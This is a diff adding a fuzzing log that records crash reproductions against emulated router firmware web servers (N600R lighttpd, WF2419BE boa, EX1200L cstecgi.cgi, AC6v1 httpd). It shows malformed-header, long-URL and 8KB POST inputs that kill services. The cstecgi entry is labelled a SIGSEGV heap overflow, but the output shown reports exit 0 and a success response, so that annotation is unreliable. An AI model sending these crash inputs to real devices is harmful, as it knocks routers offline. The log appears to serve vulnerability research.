@@ -1,0 +1,47 @@
+RRFuzz vulnerability reproduction evidence
+Captured: 2026-09-14 20:48:52 on webfuzz
+----
+Script started on 2026-09-14 20:48:52+08:00 [<not executed on terminal>]
+===== #31 N600R: malformed-header request family (same root cause as chunked-TE) =====
+baseline: ALIVE
+[bad Host value] -> b'' ; listener=DEAD(ConnectionRefusedError)
+[unknown header] -> 'ERR:ConnectionRefusedError' ; listener=DEAD(ConnectionRefusedError)
+[bad version char] -> 'ERR:ConnectionRefusedError' ; listener=DEAD(ConnectionRefusedError)
+paper_claims_batch2.sh: line 33: 1502580 Segmentation fault      (core dumped) setsid $QB/qemu-mips -L "$S" "$S/bin/lighttpd" -f /tmp/n600r_lh.conf -D > /tmp/n600r_b2.log 2>&1
+qemu: uncaught target signal 11 (Segmentation fault) - core dumped
+
+===== #10 WF2419BE boa: URL overflow -> forked child dies, listener survives =====
+baseline: ALIVE
+GET /A*600 #1 -> '<reset>' ; listener=ALIVE
+GET /A*600 #2 -> '<reset>' ; listener=ALIVE
+GET /A*600 #3 -> '<reset>' ; listener=ALIVE
+VERDICT: per-request child crashes; parent listener keeps serving (handler-level impact)
+
+===== #5 EX1200L cstecgi heap overflow: 8KB POST body (direct CGI exec) =====
+$ body = {"topicurl":"setWiFiBasicCfg","ssid2g":"A*8192",...} | qemu-mipsel cstecgi.cgi
+/home/webfuzz/Documents/qemu-rrfuzz/rrfuzz/tests/realworld/ex1200l_lighttpd/sysroot/www/cgi-bin/cstecgi.cgi: cache '/etc/ld.so.cache' is corrupt
+/dev/nvram: Permission denied
+/dev/nvram: Permission denied
+/dev/nvram: Permission denied
+/dev/nvram: Permission denied
+/dev/nvram: Permission denied
+/dev/nvram: Permission denied
+/dev/nvram: Permission denied
+/dev/nvram: Permission denied
+/dev/nvram: Permission denied
+/dev/nvram: Permission denied
+/dev/nvram: Permission denied
+{
+	"success":	true,
+	"error":	null,
+	"lan_ip":	"",
+	"wtime":	"15",
+	"reserv":	"reserv"
+}
+[exit=0] (139 = SIGSEGV heap overflow in POST body parser)
+
+===== AC6v1 CVE-2022-25459: SetSysTimeCfg time stack overflow (known-CVE reproduction) =====
+(replay-known CVE; direct demonstration via long S1 field on AC6v1 httpd)
+AC6v1 httpd binary present (CVE repro via netns httpd - requires br0; full netns run in separate step)
+
+Script done on 2026-09-14 20:49:14+08:00 [COMMAND_EXIT_CODE="0"]
